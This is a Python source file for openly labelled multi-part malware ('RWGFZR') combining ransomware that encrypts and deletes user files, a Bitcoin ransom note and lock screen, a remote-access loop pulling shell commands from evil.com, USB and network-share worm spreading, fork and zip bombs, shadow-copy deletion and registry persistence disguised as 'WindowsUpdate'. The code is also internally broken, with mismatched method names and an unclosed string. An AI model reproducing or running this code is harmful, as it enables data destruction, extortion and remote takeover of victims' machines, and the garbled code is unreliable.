import os
import sys
import subprocess
import requests
import threading
import zipfile
import shutil
from pathlib import Path
from cryptography.fernet import Fernet
import base64
import json

class RWGFZR:
    def __init__(self):
        self.c2_server = "http://evil.com:5000"
        self.victim_id = os.environ.get('COMPUTERNAME', os.uname().nodename)
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        self.target_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.txt',
            '.jpg', '.png', '.mp4', '.zip', '.rar', '.7z',
            '.db', '.sql', '.bak', '.backup', '.psd', '.ai',
            '.cpp', '.py', '.java', '.js', '.html', '.css',
            '.pem', '.key', '.crt', '.pfx', '.ovpn'
        ]
        
    def sparechange_component(self):
        
        def find_files_to_encrypt():
            """Find all user documents"""
            encrypted_files = []
            paths_to_scan = [
                os.path.expanduser("~"),  # User directory
                "C:\\Users\\",
                "C:\\Documents and Settings\\",
                "/home/",
                "/Users/"
            ]
            
            for root_path in paths_to_scan:
                if os.path.exists(root_path):
                    for root, dirs, files in os.walk(root_path):
                        # Skip system directories
                        dirs[:] = [d for d in dirs if d not in 
                                  ['Windows', 'System32', 'Program Files', 
                                   'AppData', 'bin', 'boot', 'dev', 'proc']]
                        
                        for file in files:
                            if any(file.endswith(ext) for ext in self.target_extensions):
                                full_path = os.path.join(root, file)
                                encrypted_files.append(full_path)
            return encrypted_files
        
        def encrypt_file(filepath):
            try:
                with open(filepath, 'rb') as f:
                    data = f.read()
                
                encrypted_data = self.cipher.encrypt(data)
                
                with open(filepath + '.encrypted', 'wb') as f:
                    f.write(encrypted_data)
                
                os.remove(filepath)  
                return True
            except:
                return False
        
        def create_ransom_note():
            note_content = f"""
            ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
            
            All your documents, photos, databases, and important files have been encrypted.
            
            To decrypt your files, you must pay $500 in Bitcoin to:
            Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
            
            After payment, send your computer ID to: decrypt@onionmail.com
            Your ID: {self.victim_id}
            
            Key for decryption (DON'T LOSE THIS):
            {base64.b64encode(self.encryption_key).decode()}
            
            YOU HAVE 48 HOURS OR THE KEY WILL BE DESTROYED!
            
            - RWGFZ-R Team
            
            locations = [
                os.path.expanduser("~/DESKTOP_README.txt"),
                os.path.expanduser("~/README_TO_DECRYPT.txt"),
                "C:\\RANSOM_NOTE.txt",
                "/tmp/RANSOM_NOTE.txt"
            ]
            
            for loc in locations:
                try:
                    with open(loc, 'w') as f:
                        f.write(note_content)
                except:
                    pass
            
            if os.name == 'nt':
                try:
                    import ctypes
                    SPI_SETDESKWALLPAPER = 20
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, 
                                                               None, 0)
                except:
                    pass
        
        print("[RANSOMWARE] Scanning for files...")
        files = find_files_to_encrypt()
        
        def encrypt_batch(file_batch):
            for file in file_batch:
                encrypt_file(file)
        
        batch_size = 100
        batches = [files[i:i+batch_size] for i in range(0, len(files), batch_size)]
        
        threads = []
        for batch in batches:
            t = threading.Thread(target=encrypt_batch, args=(batch,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"[RANSOMWARE] Encrypted {len(files)} files!")
        create_ransom_note()
        
        try:
            requests.post(f"{self.c2_server}/ransom_key", 
                         json={"victim": self.victim_id, 
                               "key": base64.b64encode(self.encryption_key).decode()})
        except:
            pass
    
    def wrat_component(self):
        while True:
            try:
                cmd = requests.get(f"{self.c2_server}/commands", timeout=5).text
                if cmd:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    requests.post(f"{self.c2_server}/results", 
                                  data=f"[{self.victim_id}]\n{result.stdout}")
            except:
                pass
            threading.Event().wait(5)  
    
    def snake_component(self):
        while True:
            for drive in self.find_usb_drives():
                dest = os.path.join(drive, "System_Update.py")
                if not os.path.exists(dest):
                    shutil.copy2(sys.argv[0], dest)
                    with open(os.path.join(drive, "README_RANSOM.txt"), 'w') as f:
                        f.write("This drive has been infected! Your files are encrypted!")
            
            for share in self.find_network_shares():
                try:
                    subprocess.run(f"copy {sys.argv[0]} \\\\{share}\\RWGFZ-R.py", shell=True)
                    subprocess.run(f"psexec \\\\{share} -s python RWGFZ-R.py", shell=True)
                except:
                    pass
            
            threading.Event().wait(30)  
    
    def gzi_component(self):
        try:
            import tkinter as tk
            import ctypes
            
            def show_ransom_screen():
                root = tk.Tk()
                root.geometry(f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}")
                root.title("🔒 YOUR FILES ARE ENCRYPTED 🔒")
                
                root.configure(bg='red')
                
                message = """
                ⚠️⚠️⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
                
                All your documents, photos, and files are locked.
                
                To decrypt your files, pay $500 in Bitcoin to:
                1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
                
                YOU HAVE 48 HOURS!
                
                DO NOT ATTEMPT TO REMOVE THIS PROGRAM!
                """
                
                label = tk.Label(root, text=message, font=("Arial", 24, "bold"), 
                               fg="white", bg="red")
                label.pack(expand=True)
                
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.mainloop()
            
            def flash_screen():
                while True:
                    ctypes.windll.user32.MessageBoxW(0, "FILES ENCRYPTED! PAY RANSOM!", 
                                                     "RANSOMWARE", 0x10)
                    threading.Event().wait(1)
            
            threading.Thread(target=show_ransom_screen, daemon=True).start()
            threading.Thread(target=flash_screen, daemon=True).start()
        except:
            pass
    
    def forkbxmb_component(self):
        """Process explosion - prevents killing the ransomware"""
        def bomb():
            while True:
                if os.name == 'nt':
                    subprocess.Popen(['start', sys.executable, __file__, '--fork'], shell=True)
                else:
                    os.fork()
                bomb()
        
        for _ in range(20):
            threading.Thread(target=bomb, daemon=True).start()
    
    def zipbxmb_component(self):
        """Storage explosion - prevents recovery"""
        def create_zipbomb():
            filename = f"recovery_{os.getpid()}.zip"
            with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
                data = b'\x00' * (1024 * 1024 * 100) 
                for i in range(100):
                    zf.writestr(f"file_{i}.bin", data)
            
            while True:
                try:
                    with zipfile.ZipFile(filename, 'r') as zf:
                        zf.extractall()
                except:
                    pass
        
        locations = ['C:\\', 'C:\\Users\\', '/tmp/', '/var/tmp/']
        for loc in locations:
            try:
                os.chdir(loc)
                for _ in range(5):
                    threading.Thread(target=create_zipbomb, daemon=True).start()
            except:
                pass
    
    def find_usb_drives(self):
        if os.name == 'nt':
            import string
            from ctypes import windll
            drives = []
            bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    if windll.kernel32.GetDriveTypeW(f"{letter}:\\") == 2:
                        drives.append(f"{letter}:\\")
                bitmask >>= 1
            return drives
        return ['/media/', '/mnt/']
    
    def find_network_shares(self):
        # Network scanning would go here
        return []
    
    def anti_recovery_component(self):
        """Prevents system recovery"""
        if os.name == 'nt':
            try:
                subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
                subprocess.run("wmic shadowcopy delete", shell=True)
                subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)
                subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True)
            except:
                pass
        
        try:
            if os.name == 'nt':
                subprocess.run("net stop wscsvc", shell=True)
                subprocess.run("sc config wscsvc start= disabled", shell=True)
        except:
            pass
        
        backup_processes = ['backup', 'ntbackup', 'backupexec', 'vssvc']
        for proc in backup_processes:
            try:
                subprocess.run(f"taskkill /f /im {proc}.exe", shell=True)
            except:
                pass
    
    def execute(self):
        
        self.anti_recovery_component()
        
        components = [
            ("SPARECHANGE", self.ransomware_component),
            ("SNAKE", self.worm_component),
            ("GZI", self.gdi_component),
            ("FORKBXMB", self.forkbomb_component),
            ("ZIPBXMB", self.zipbomb_component),
            ("WRAT", self.rat_component), 
        ]
        
        for name, component in components:
            print(f"[*] Starting {name} component...")
            thread = threading.Thread(target=component, daemon=True)
            thread.start()
        
        while True:
            threading.Event().wait(60)

if __name__ == "__main__":
    if not os.environ.get('RWGFZR_RUNNING'):
        os.environ['RWGFZR_RUNNING'] = '1'
        
        if os.name == 'nt':
            import winreg
            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            except:
                pass
    
    Fun = RWGFZR()
    Fun.execute()
